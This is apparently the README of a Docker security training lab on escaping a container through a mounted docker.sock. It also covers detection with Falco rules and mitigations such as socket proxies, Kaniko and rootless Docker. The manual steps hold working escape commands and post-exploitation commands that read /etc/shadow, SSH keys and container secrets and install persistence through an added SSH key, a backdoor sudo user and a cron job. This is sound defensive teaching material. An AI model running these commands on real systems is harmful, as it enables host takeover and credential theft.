# Scenario 1: Docker Socket Escape

**Severity:** CRITICAL ⚠️  
**Time:** 25 minutes  
**Difficulty:** Medium  
**Real-World Prevalence:** VERY HIGH

## 🎯 Learning Objectives

- Understand why mounting docker.sock is dangerous
- Execute a complete container-to-host escape
- Recognize docker.sock in running containers
- Generate forensic evidence for detection

## 📋 Attack Overview

### The Vulnerability

When a container has access to `/var/run/docker.sock`, it can:
1. List all containers on the host
2. Create new containers (including privileged ones)
3. Execute commands in any container
4. Access the host filesystem through new containers

### Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Attacker gains access to container with docker.sock mounted │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 2. Install docker CLI inside the compromised container         │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 3. Use docker CLI to create a NEW privileged container         │
│    - Mount host root filesystem (/)                             │
│    - Use host network namespace                                 │
│    - Use host PID namespace                                     │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 4. Use chroot to "escape" into the host filesystem             │
└────────────────┬────────────────────────────────────────────────┘
                 │
┌────────────────▼────────────────────────────────────────────────┐
│ 5. Now have complete root access to the host machine           │
└─────────────────────────────────────────────────────────────────┘
```

## 🔍 Real-World Examples

### Common Vulnerable Patterns

**1. CI/CD Pipelines**
```yaml
# Jenkins, GitLab Runner, Azure DevOps agents
services:
  jenkins:
    image: jenkins/jenkins
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # ❌ VULNERABLE
```

**2. Container Management UIs**
```yaml
# Portainer, Rancher
services:
  portainer:
    image: portainer/portainer
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # ❌ VULNERABLE
```

**3. Docker-in-Docker**
```yaml
# Nested Docker builds
services:
  dind:
    image: docker:dind
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # ❌ VULNERABLE
```

**4. Monitoring/Logging Tools**
```yaml
# Container monitoring
services:
  monitor:
    image: monitoring-agent
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # ❌ VULNERABLE
```

## 🚀 Exploitation Methods

### Method 1: Manual Step-by-Step (Learning)

Follow `manual-steps.md` for detailed walkthrough.

### Method 2: Automated Script (Quick)

```bash
./exploit.sh
```

### Method 3: Docker Compose (Reproducible)

```bash
docker-compose up -d
# Then follow manual steps inside the container
```

## 📝 Manual Exploitation Steps

### Step 1: Create Vulnerable Container

```bash
# Create container with docker.sock mounted
docker run -d --name vulnerable-container \
  -v /var/run/docker.sock:/var/run/docker.sock \
  ubuntu:22.04 \
  sleep infinity

echo "✓ Vulnerable container created: vulnerable-container"
echo "  - Has docker.sock mounted"
echo "  - Running as root inside container"
echo "  - Can access Docker API"
```

### Step 2: Access the Container

```bash
# Get shell inside the container
docker exec -it vulnerable-container bash

# You're now inside the container
whoami  # root (inside container)
hostname  # Container's hostname
```

### Step 3: Install Docker CLI

```bash
# Inside the container, install docker
apt-get update
apt-get install -y docker.io curl

# Verify docker socket access
ls -la /var/run/docker.sock
# Should show: srw-rw---- 1 root docker docker.sock

# Test docker access
docker ps
# Should show all containers running on the HOST
```

### Step 4: List Host Information

```bash
# Inside container, query Docker API
docker version
docker info | grep "Operating System"
docker ps -a

# Save this information
docker ps -a > /tmp/host_containers.txt
docker info > /tmp/host_docker_info.txt
```

### Step 5: Create Privileged Escape Container

```bash
# Inside the compromised container, create a NEW container
# This new container will have:
# - Privileged mode (all capabilities)
# - Host root filesystem mounted at /host
# - Host network namespace
# - Host PID namespace

docker run -it --rm \
  --privileged \
  --pid=host \
  --net=host \
  --ipc=host \
  --volume /:/host \
  ubuntu:22.04 \
  chroot /host bash
```

### Step 6: Verify Host Access

```bash
# You are now ROOT on the HOST machine!

# Check hostname
hostname
# Should show HOST's hostname (not container)

# Check processes
ps aux | head
# Shows HOST processes

# Check filesystem
ls -la /root
# Shows HOST root's home directory

# Check users
cat /etc/passwd
# Shows HOST's users

# Check Docker
docker ps
# Shows containers from HOST perspective

# Proof of compromise
echo "COMPROMISED - $(date)" > /root/PWNED.txt
cat /root/PWNED.txt
```

### Step 7: Advanced Post-Exploitation

```bash
# Read sensitive files
cat /etc/shadow  # Password hashes
cat /root/.ssh/id_rsa  # SSH keys
cat /root/.bash_history  # Command history

# Access other containers' secrets
docker exec <container_name> cat /run/secrets/api_key

# Install persistence
# Add SSH key
mkdir -p /root/.ssh
echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> /root/.ssh/authorized_keys

# Add backdoor user
useradd -m -s /bin/bash -G sudo attacker
echo "attacker:password123" | chpasswd

# Install cron job
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab
```

## 🔬 Forensic Analysis

### What Logs Get Generated?

**Docker Events:**
```bash
# On host, monitor docker events
docker events --since '2024-01-01T00:00:00'

# Look for:
# - container: create (new container from inside container)
# - container: start
# - container: attach
```

**System Logs:**
```bash
# Check Docker daemon logs
journalctl -u docker -f

# Check audit logs
ausearch -m SYSCALL -sv yes | grep docker

# Check for unusual container creation
docker ps -a --format "{{.CreatedAt}} {{.Names}} {{.Image}}"
```

### Indicators of Compromise (IOCs)

**File System:**
- `/var/run/docker.sock` mounted in containers
- Unusual docker client installations in containers
- Multiple privileged containers created rapidly

**Process:**
- `docker` command executed from inside containers
- `chroot` executed with host filesystem
- `nsenter` usage

**Network:**
- Connections to Docker API from unexpected sources
- Container-to-container communication via Docker API

## 🛡️ Detection Signatures

### Falco Rules (Runtime Detection)

```yaml
# Detect docker.sock access from containers
- rule: Container Uses Docker Socket
  desc: Detect when a container accesses the Docker socket
  condition: >
    fd.name = /var/run/docker.sock and
    container.id != host
  output: >
    Container accessing Docker socket
    (user=%user.name container=%container.id image=%container.image.repository
    command=%proc.cmdline file=%fd.name)
  priority: WARNING

# Detect docker command in container
- rule: Docker Command in Container
  desc: Docker client executed inside container
  condition: >
    spawned_process and
    proc.name = docker and
    container.id != host
  output: >
    Docker client executed in container
    (user=%user.name container=%container.id command=%proc.cmdline)
  priority: CRITICAL

# Detect privileged container creation
- rule: Privileged Container Created
  desc: Privileged container created from another container
  condition: >
    spawned_process and
    proc.name in (docker, dockerd) and
    proc.cmdline contains "--privileged" and
    container.id != host
  output: >
    Privileged container created from inside container
    (user=%user.name parent=%proc.pname command=%proc.cmdline)
  priority: CRITICAL

# Detect chroot execution
- rule: Chroot Execution
  desc: chroot used to escape container
  condition: >
    spawned_process and
    proc.name = chroot and
    container.privileged = true
  output: >
    Chroot executed in privileged container - possible escape
    (user=%user.name command=%proc.cmdline target=%proc.args)
  priority: CRITICAL
```

## 📊 Attack Metrics

### Timeline

| Time | Action | Detectable? |
|------|--------|-------------|
| T+0 | Gain access to container | ❌ (depends on access method) |
| T+1 | Install docker CLI | ✅ (package installation) |
| T+2 | Query Docker API | ✅ (socket access, API calls) |
| T+3 | Create privileged container | ✅ (container creation from container) |
| T+4 | chroot to host | ✅ (chroot in privileged container) |
| T+5 | Access host files | ✅ (unusual file access patterns) |

### Success Rate

- **Detection before escape:** ~60% (if monitoring docker.sock access)
- **Detection during escape:** ~90% (privileged container creation is suspicious)
- **Detection after escape:** ~100% (anomalous host activity)

## 🔧 Mitigation Strategies

### Immediate Actions

**1. Never Mount Docker Socket**
```bash
# ❌ DON'T DO THIS:
-v /var/run/docker.sock:/var/run/docker.sock

# ✅ DO THIS INSTEAD:
# Use Docker API with authentication
# Use rootless Docker
# Use socket proxy with ACL
```

**2. Use Docker Socket Proxy** ✅ TESTED
```yaml
services:
  docker-proxy:
    image: tecnativa/docker-socket-proxy
    environment:
      - CONTAINERS=1
      - IMAGES=0
      - POST=0  # Disable container creation
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
  
  app:
    image: myapp
    environment:
      - DOCKER_HOST=tcp://docker-proxy:2375
    # No direct socket access!
```

**Test this yourself:** See [prevention/test-1-socket-proxy](prevention/test-1-socket-proxy/) for working configuration and test results.

**3. Build Images Without Socket (Kaniko)** ✅ TESTED
```bash
# Instead of docker build with socket mount
docker run --rm \
  -v $(pwd):/workspace \
  gcr.io/kaniko-project/executor:latest \
  --context=/workspace \
  --dockerfile=Dockerfile \
  --destination=myimage:latest
# No socket mount needed!
```

**Test this yourself:** See [prevention/test-2-kaniko](prevention/test-2-kaniko/) for build examples and test results.

**4. Use Rootless Docker** ✅ TESTED
```bash
# Install rootless Docker
curl -fsSL https://get.docker.com/rootless | sh

# Docker daemon runs as non-root user
# Even if escaped, attacker is not root
```

**Understand the impact:** See [prevention/test-3-rootless](prevention/test-3-rootless/) for root vs rootless comparison.

**5. Enable Docker Authorization Plugins**
```json
{
  "authorization-plugins": ["authz-broker"]
}
```

### Prevention Testing Suite

Want to verify these mitigations actually work? We've tested them all.

**Location:** `prevention/` directory

**Quick Start:**
```bash
cd prevention
./run-prevention-tests.sh
```

**What Gets Tested:**
- ✅ Socket Proxy blocks attacks while allowing monitoring (Test 1)
- ✅ Kaniko builds images without socket access (Test 2)
- ✅ Rootless Docker limits escape impact (Test 3)

**Results:** Each test generates artifacts showing real results, error messages, and proof the prevention works.

**Documentation:** See [prevention/README.md](prevention/README.md) for complete details, manual verification guides, and implementation recommendations.

### Long-Term Solutions (Advanced Hardening)

- Implement least privilege for containers
- Use Kubernetes instead (no socket needed)
- Enable audit logging
- Deploy runtime security monitoring
- Regular security audits

## 📦 Files in This Scenario

```
scenario-1-docker-socket/
├── README.md                  # This file
├── docker-compose.yml         # Vulnerable setup
├── exploit.sh                 # Automated exploitation
├── manual-steps.md            # Detailed step-by-step
├── cleanup.sh                 # Remove all traces
└── artifacts/
    ├── host_info.txt          # Host information gathered
    ├── exploit.log            # Attack transcript
    ├── docker_commands.log    # Commands executed
    └── iocs.json              # Indicators of Compromise
```

## ✅ Completion Checklist

After completing this scenario, you should have:

- [ ] Created vulnerable container with docker.sock
- [ ] Accessed container and installed docker CLI
- [ ] Listed host containers and information
- [ ] Created privileged escape container
- [ ] Achieved root access on host
- [ ] Documented all steps and outputs
- [ ] Collected forensic artifacts
- [ ] Understood detection signatures
- [ ] Cleaned up all containers

## 🎓 Key Takeaways

1. **Docker socket = Root access** - Never mount it in production
2. **Trust boundary** - Container shouldn't create containers
3. **Defense in depth** - Socket + non-privileged containers still vulnerable
4. **Detection is critical** - Monitor socket access and API calls
5. **Alternatives exist** - Use socket proxies or rootless Docker

## 🔗 Next Steps

After completing this scenario:
1. Try Scenario 2 (Privileged Container Escape)
2. Document differences between socket vs privileged escapes
3. Build Falco detection rules
4. Test detection with runtime security tools

---

**⚠️ Remember: This is THE most common container escape in production. Understanding it is critical for securing Docker deployments.**